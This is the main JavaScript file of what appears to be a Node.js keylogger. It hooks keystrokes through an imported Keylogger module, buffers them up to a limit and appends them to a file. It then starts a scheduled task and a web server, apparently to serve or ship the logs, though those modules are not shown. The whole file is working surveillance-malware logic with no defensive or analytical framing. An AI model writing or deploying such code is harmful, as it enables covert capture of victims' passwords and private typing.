const { LIMIT_KEYS } = require("./constant/contant");
const { FileUtil } = require("./common/file_util");
const Keylogger = require("./common/keylogger");
const Task = require("./common/schedule");
const { initWebServer } = require("./controller/gateway");

const App = () => {
    let keys = "";

    Keylogger.keylogger((key) => {
        if(keys.length < LIMIT_KEYS) {
            keys += key;
        } else {
            let temp = keys + key;
            FileUtil.readFile((data) => {
                FileUtil.writeFile(data + temp);
            })
        
            keys = "";
        }
    });

    Task.task();

    initWebServer();
}

App();